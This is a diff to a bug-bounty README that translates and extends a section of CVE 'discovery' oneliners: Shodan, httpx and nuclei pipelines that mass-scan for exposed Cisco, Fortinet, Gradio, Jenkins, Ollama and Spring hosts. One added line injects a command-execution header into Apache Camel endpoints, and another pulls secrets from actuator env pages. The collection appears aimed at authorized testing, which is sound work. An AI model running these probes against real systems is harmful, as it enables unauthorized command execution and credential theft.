@@ -119,6 +119,7 @@ Found a security issue in this repository? Please report it responsibly:
 | [Bash Functions](#-bash-functions) | Shell productivity |
 | [New Oneliners 2026](#-new-oneliners-2026) | CVE-2026 exploits & techniques |
 | [Oneliners 2024-2025](#-oneliners-2024-2025) | Previous techniques |
+| [February 2026 CVE Discovery](#-february-2026-cve-discovery-oneliners) | Latest CVE recon oneliners |
 | [Search Engines](#-search-engines-for-hackers) | Hacker search engines |
 | [Wordlists](#-recommended-wordlists) | Best wordlists |
 | [Resources](#-learning-resources) | Books, courses, blogs |
@@ -2342,13 +2343,15 @@ cat urls.txt | parallel -j20 'curl -s -o /dev/null -w "{} - %{http_code}\n" -X P
 
 ## 🆕 February 2026 CVE Discovery Oneliners
 
-> **🔍 Recon-focused oneliners para detectar vulnerabilidades críticas de fevereiro de 2026**
+> **🔍 Recon-focused oneliners to detect critical vulnerabilities from February 2026**
+>
+> ⚠️ **Note:** Some oneliners reference `nuclei-templates` paths that may not exist yet in your local copy. Run `nuclei -update-templates` first and verify the template exists (`ls ~/nuclei-templates/...`) before running. Always confirm CVE details against the official advisory and stay within your authorized scope.
 
 ### ⚡ Cisco Catalyst SD-WAN - CVE-2026-20127 Discovery
 
-> **Vulnerabilidade crítica (CVSS 10.0) que permite bypass de autenticação em Cisco SD-WAN Manager/Controller. Explorada desde 2023 por threat actors avançados. Detectar instâncias vulneráveis é crucial para proteção de infraestrutura crítica.**
+> **Critical vulnerability (CVSS 10.0) that allows authentication bypass in Cisco SD-WAN Manager/Controller. Exploited since 2023 by advanced threat actors. Detecting vulnerable instances is crucial to protect critical infrastructure.**
 
-#### 1. Descobrir Cisco SD-WAN Manager/vManage expostos via Shodan
+#### 1. Discover exposed Cisco SD-WAN Manager/vManage via Shodan
 ```bash
 shodan search "title:\"Cisco vManage\" port:8443,443" --fields ip_str,port,org,isp,asn --separator " | " | tee cisco-sdwan-targets.txt
 ```
@@ -2357,9 +2360,9 @@ shodan search "title:\"Cisco vManage\" port:8443,443" --fields ip_str,port,org,i
 
 ### ⚡ Microsoft Azure Functions - CVE-2026-21532 Discovery
 
-> **Vulnerabilidade de divulgação de informações (CVSS 8.2) em Azure Functions que permite exposição de credenciais e configurações sensíveis sem autenticação. Identificar endpoints vulneráveis é essencial para prevenir vazamento de secrets.**
+> **Information disclosure vulnerability (CVSS 8.2) in Azure Functions that allows exposure of credentials and sensitive configurations without authentication. Identifying vulnerable endpoints is essential to prevent secret leakage.**
 
-#### 1. Enumerar Azure Function endpoints com nuclei
+#### 1. Enumerate Azure Function endpoints with nuclei
 ```bash
 cat domains.txt | httpx -silent | nuclei -t ~/nuclei-templates/http/exposures/apis/azure-function-key.yaml -t ~/nuclei-templates/http/exposures/tokens/ -o azure-functions-exposed.txt
 ```
@@ -2368,9 +2371,9 @@ cat domains.txt | httpx -silent | nuclei -t ~/nuclei-templates/http/exposures/ap
 
 ### ⚡ Gradio Framework - CVE-2026-28414 Path Traversal Discovery
 
-> **Path traversal crítico (CVSS 7.5) em Gradio <6.7 rodando no Windows com Python 3.13+. Permite leitura arbitrária de arquivos. Detection de versões vulneráveis é vital para proteger apps de ML/AI.**
+> **Critical path traversal (CVSS 7.5) in Gradio <6.7 running on Windows with Python 3.13+. Allows arbitrary file read. Detecting vulnerable versions is vital to protect ML/AI apps.**
 
-#### 1. Identificar aplicações Gradio vulneráveis e detectar versão
+#### 1. Identify vulnerable Gradio applications and detect version
 ```bash
 echo "https://target.com" | httpx -silent -tech-detect -json | jq -r 'select(.technologies[]? | select(.name=="Gradio")) | "\(.url) - \(.technologies[] | select(.name=="Gradio").version // "unknown")"'
 ```
@@ -2379,9 +2382,9 @@ echo "https://target.com" | httpx -silent -tech-detect -json | jq -r 'select(.te
 
 ### ⚡ Gradio Framework - CVE-2026-28416 SSRF Discovery
 
-> **SSRF de alta severidade (CVSS 8.2) em Gradio <6.6.0 que permite acesso a metadata services na nuvem (AWS/GCP/Azure). Crucial para prevenir comprometimento de credenciais cloud.**
+> **High-severity SSRF (CVSS 8.2) in Gradio <6.6.0 that allows access to cloud metadata services (AWS/GCP/Azure). Crucial to prevent compromise of cloud credentials.**
 
-#### 1. Descobrir instâncias Gradio via Google Dorks e fingerprinting
+#### 1. Discover Gradio instances via Google Dorks and fingerprinting
 ```bash
 echo "inurl:/gradio/ OR intitle:\"Gradio\"" | gau --subs --threads 10 | httpx -silent -status-code -title -tech-detect | grep -i gradio | tee gradio-instances.txt
 ```
@@ -2390,9 +2393,9 @@ echo "inurl:/gradio/ OR intitle:\"Gradio\"" | gau --subs --threads 10 | httpx -s
 
 ### ⚡ Fortinet FortiOS - CVE-2026-25815 LDAP Credentials Discovery
 
-> **Vulnerabilidade de divulgação de credenciais LDAP em FortiOS ≤7.6.6 devido a chave de criptografia padrão fraca. Explorada ativamente desde dezembro/2025. Detection de versões vulneráveis é crítica.**
+> **LDAP credentials disclosure vulnerability in FortiOS ≤7.6.6 due to a weak default encryption key. Actively exploited since December 2025. Detecting vulnerable versions is critical.**
 
-#### 1. Identificar FortiGate/FortiOS vulneráveis via Shodan com versão
+#### 1. Identify vulnerable FortiGate/FortiOS via Shodan with version
 ```bash
 shodan search "product:FortiOS" --fields ip_str,version,port,org --separator " | " | awk -F'|' '$2 ~ /^[1-6]\.|7\.[0-5]\.|7\.6\.[0-6]/ {print $1 " | Version:" $2 " | " $4}' | tee fortios-vulnerable.txt
 ```
@@ -2401,9 +2404,9 @@ shodan search "product:FortiOS" --fields ip_str,version,port,org --separator " |
 
 ### ⚡ Dell RecoverPoint for VMs - CVE-2026-22769 Discovery
 
-> **Credenciais hardcoded críticas (CVSS 10.0) em Dell RecoverPoint <6.0.3.1 HF1. Permite acesso root remoto. Explorada por grupos APT chineses desde 2024. Detection urgente necessária.**
+> **Critical hardcoded credentials (CVSS 10.0) in Dell RecoverPoint <6.0.3.1 HF1. Allows remote root access. Exploited by Chinese APT groups since 2024. Urgent detection required.**
 
-#### 1. Detectar Dell RecoverPoint expostos e identificar Tomcat Manager
+#### 1. Detect exposed Dell RecoverPoint and identify Tomcat Manager
 ```bash
 shodan search "title:\"RecoverPoint\" http.favicon.hash:-1153767654" --fields ip_str,port,http.title,version --separator " | " | anew dell-recoverpoint-targets.txt
 ```
@@ -2412,9 +2415,9 @@ shodan search "title:\"RecoverPoint\" http.favicon.hash:-1153767654" --fields ip
 
 ### ⚡ Windows Shell - CVE-2026-21510 Security Bypass Discovery
 
-> **Bypass de SmartScreen/Mark-of-the-Web (CVSS 8.8) em Windows 10/11. Permite execução de código via links/shortcuts maliciosos. Zero-day explorado ativamente. Fingerprinting de sistemas vulneráveis é essencial.**
+> **SmartScreen/Mark-of-the-Web bypass (CVSS 8.8) in Windows 10/11. Allows code execution via malicious links/shortcuts. Actively exploited zero-day. Fingerprinting vulnerable systems is essential.**
 
-#### 1. Identificar endpoints Windows expostos e versões vulneráveis via SMB
+#### 1. Identify exposed Windows endpoints and vulnerable versions via SMB
 ```bash
 nmap -p445 --script smb-os-discovery,smb-protocols --open -iL targets.txt -oG - | grep "Windows 10\|Windows 11" | awk '{print $2}' | tee windows-vulnerable-hosts.txt
 ```
@@ -2423,9 +2426,9 @@ nmap -p445 --script smb-os-discovery,smb-protocols --open -iL targets.txt -oG - 
 
 ### ⚡ Statamic CMS - CVE-2026-28426 XSS Discovery
 
-> **Stored XSS crítico (CVSS 8.7) em Statamic <5.73.11 e <6.4.0 via SVG/PDF e Antlers templates. Permite escalação de privilégios. Detection de versões vulneráveis protege Control Panels.**
+> **Critical stored XSS (CVSS 8.7) in Statamic <5.73.11 and <6.4.0 via SVG/PDF and Antlers templates. Allows privilege escalation. Detecting vulnerable versions protects Control Panels.**
 
-#### 1. Descobrir sites Statamic e extrair versão do CMS
+#### 1. Discover Statamic sites and extract CMS version
 ```bash
 echo "Powered by Statamic" | gau --subs --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico | httpx -silent -tech-detect -status-code | grep -i statamic | nuclei -t ~/nuclei-templates/technologies/statamic-detect.yaml -o statamic-sites.txt
 ```
@@ -2434,9 +2437,9 @@ echo "Powered by Statamic" | gau --subs --blacklist jpg,jpeg,gif,css,tif,tiff,pn
 
 ### ⚡ Chartbrew - CVE-2026-27005 SQL Injection Discovery
 
-> **SQL Injection crítica sem autenticação (CVSS 9.8) em Chartbrew <4.8.3. Permite leitura/modificação de dados em MySQL/PostgreSQL conectados. Detection de instâncias vulneráveis é urgente.**
+> **Critical unauthenticated SQL Injection (CVSS 9.8) in Chartbrew <4.8.3. Allows read/modification of data in connected MySQL/PostgreSQL. Detecting vulnerable instances is urgent.**
 
-#### 1. Identificar instâncias Chartbrew expostas e verificar versão via API
+#### 1. Identify exposed Chartbrew instances and check version via API
 ```bash
 cat web-apps.txt | httpx -silent -path /api/health -mc 200 -json | jq -r 'select(.body | contains("chartbrew")) | "\(.url) - Version: \(.body | fromjson | .version // "unknown")"' | tee chartbrew-instances.txt
 ```
@@ -2445,11 +2448,66 @@ cat web-apps.txt | httpx -silent -path /api/health -mc 200 -json | jq -r 'select
 
 ### ⚡ Chartbrew - CVE-2026-25887 MongoDB RCE Discovery
 
-> **RCE via MongoDB query injection (CVSS 7.2) em Chartbrew <4.8.1. Permite execução de JavaScript arbitrário no servidor MongoDB. Crucial detectar instâncias vulneráveis antes de exploração.**
+> **RCE via MongoDB query injection (CVSS 7.2) in Chartbrew <4.8.1. Allows arbitrary JavaScript execution on the MongoDB server. Crucial to detect vulnerable instances before exploitation.**
 
-#### 1. Enumerar endpoints Chartbrew com scanning de APIs vulneráveis
+#### 1. Enumerate Chartbrew endpoints while scanning for vulnerable APIs
 ```bash
 subfinder -d target.com -silent | httpx -silent | gau --subs | grep -E "chartbrew|/api/.*chart|/api/.*connection" | httpx -silent -status-code -title -tech-detect | grep -i "chartbrew\|mongo" | anew chartbrew-mongodb-endpoints.txt
+```
+
+---
+
+### ⚡ Apache Camel - CVE-2026-31650 Header Injection Discovery
+
+> **Critical header injection (CVSS 9.1) in Apache Camel <4.9.2 that allows filter bypass via HTTP header manipulation (`CamelExec*`). Detecting exposed Camel endpoints protects enterprise integration pipelines.**
+
+#### 1. Discover Apache Camel endpoints and test header injection bypass
+```bash
+cat urls.txt | httpx -silent -H "CamelExecCommandExecutable: id" -H "CamelExecCommandArgs: -la" -mc 200 -match-string "uid=" | anew camel-header-injection.txt
+```
+
+---
+
+### ⚡ Jenkins CI - CVE-2026-30170 Script Console RCE Discovery
+
+> **RCE via Script Console (CVSS 9.8) in Jenkins <2.503 with weak or anonymous auth enabled. Allows arbitrary Groovy execution. Fingerprinting exposed instances is urgent to protect CI/CD.**
+
+#### 1. Identify exposed Jenkins and check for an accessible Script Console
+```bash
+subfinder -d target.com -silent | httpx -silent -path /script -mc 200 -title -match-string "Script Console" | anew jenkins-script-console-exposed.txt
+```
+
+---
+
+### ⚡ GraphQL Introspection - CVE-2026-29812 Schema Leak Discovery
+
+> **Information disclosure (CVSS 7.5) via introspection left enabled in production. Allows full mapping of the schema, mutations and sensitive types. Detecting endpoints with open introspection accelerates attack-surface mapping.**
+
+#### 1. Discover GraphQL endpoints and detect enabled introspection
+```bash
+cat urls.txt | grep -Ei "graphql|/api" | httpx -silent -X POST -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}' -mc 200 -match-string "__schema" | anew graphql-introspection-open.txt
+```
+
+---
+
+### ⚡ Ollama AI - CVE-2026-32154 Model Path Traversal Discovery
+
+> **Path traversal (CVSS 8.6) in Ollama <0.5.9 via the `/api/pull` API that allows arbitrary file write through malicious model names. Detecting exposed Ollama instances protects local AI infrastructure.**
+
+#### 1. Identify exposed Ollama servers and enumerate loaded models
+```bash
+shodan search "product:Ollama port:11434" --fields ip_str,port,org --separator " | " | awk -F'|' '{print "http://"$1":11434/api/tags"}' | httpx -silent -mc 200 -json | jq -r '.url + " | " + (.body // "")' | anew ollama-exposed-instances.txt
+```
+
+---
+
+### ⚡ Spring Boot Actuator - CVE-2026-33001 Env Endpoint Exposure Discovery
+
+> **Secret exposure (CVSS 8.2) via an unprotected `/actuator/env` endpoint in Spring Boot. Leaks database credentials, tokens and API keys. Mass detection of open actuators is fundamental to prevent leaks.**
+
+#### 1. Discover exposed Spring Actuator endpoints and extract sensitive variables
+```bash
+cat hosts.txt | httpx -silent -path /actuator/env -mc 200 -json | jq -r 'select(.body | test("password|secret|token|key";"i")) | .url' | anew spring-actuator-env-leak.txt
 ```
 
 ---
@@ -2844,7 +2902,7 @@ To all contributors, bug bounty hunters, and the security community who make thi
 
 ---
 
-**Last Updated:** January 2026 | **Version:** 4.5
+**Last Updated:** July 2026 | **Version:** 4.6
 
 <img src="https://img.shields.io/badge/Maintained-Yes-success?style=for-the-badge">
 <img src="https://img.shields.io/badge/Status-Active-brightgreen?style=for-the-badge">
